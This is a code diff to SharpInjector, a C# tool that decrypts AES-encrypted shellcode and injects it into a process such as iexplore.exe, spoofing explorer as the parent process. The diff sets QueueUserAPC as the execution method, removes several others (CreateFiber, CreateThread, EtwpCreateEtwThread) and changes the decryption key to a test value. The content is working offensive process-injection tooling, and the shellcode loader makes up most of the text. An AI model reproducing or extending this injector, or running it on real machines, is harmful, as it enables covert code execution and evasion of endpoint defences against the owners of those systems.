@@ -19,7 +19,7 @@ namespace SharpInjector
         static void Main(string[] args)
         {
 
-            const ExecutionMethod exeMethod = ExecutionMethod.CreateFiber; // CHANGE THIS; shellcode exectuon method
+            const ExecutionMethod exeMethod = ExecutionMethod.QueueUserAPC; // CHANGE THIS; shellcode exectuon method
 
             string ParentName = "explorer"; // CHANGE THIS: name of parent process
             string ProgramPath = @"C:\Program Files\Internet Explorer\iexplore.exe"; // CHANGE THIS: path to process shellcode will be injected into
@@ -58,29 +58,9 @@ namespace SharpInjector
             // pass shellcode to our execution function
             switch (exeMethod)
             {
-                case ExecutionMethod.CreateFiber:
-                    Console.WriteLine("[*] Execution method: CreateFiber");
-                    CreateFiber.ExecuteCreateFiber(Shellcode);
-                    break;
-
                 case ExecutionMethod.CreateRemoteThread:
                     Console.WriteLine("[*] Execution method: CreateRemoteThread");
                     CreateRemoteThread.ExecuteCreateRemoteThread(ParentName, ProgramPath, Shellcode);
-                    break;
-
-                case ExecutionMethod.CreateRemoteThreadEx:
-                    Console.WriteLine("[*] Execution method: CreateRemoteThreadEx");
-                    CreateRemoteThreadEx.ExecuteCreateRemoteThreadEx(ParentName, ProgramPath, Shellcode);
-                    break;
-
-                case ExecutionMethod.CreateThread:
-                    Console.WriteLine("[*] Execution method: CreateThread");
-                    CreateThread.ExecuteCreateThread(Shellcode);
-                    break;
-
-                case ExecutionMethod.EtwpCreateEtwThread:
-                    Console.WriteLine("[*] Execution method: EtwpCreateEtwThread");
-                    EtwpCreateEtwThread.ExecuteEtwpCreateEtwThread(Shellcode);
                     break;
 
                 case ExecutionMethod.QueueUserAPC:
@@ -100,7 +80,7 @@ namespace SharpInjector
         // Decryptor func
         public static string Dec(string ciphertext)
         {
-            string key = "01010101010101010101010101010101"; // CHANGE THIS 16/24/32 BYTE VALUE TO MATCH ENCRYPTION KEY
+            string key = "Thisismytestkey1"; // CHANGE THIS 16/24/32 BYTE VALUE TO MATCH ENCRYPTION KEY
 
             byte[] iv = new byte[16];
             byte[] buffer = Convert.FromBase64String(ciphertext);
@@ -128,11 +108,7 @@ namespace SharpInjector
         // Execution Types
         public enum ExecutionMethod
         {
-            CreateFiber,
             CreateRemoteThread,
-            CreateRemoteThreadEx,
-            CreateThread,
-            EtwpCreateEtwThread,
             QueueUserAPC,
             RtlCreateUserThread
         }
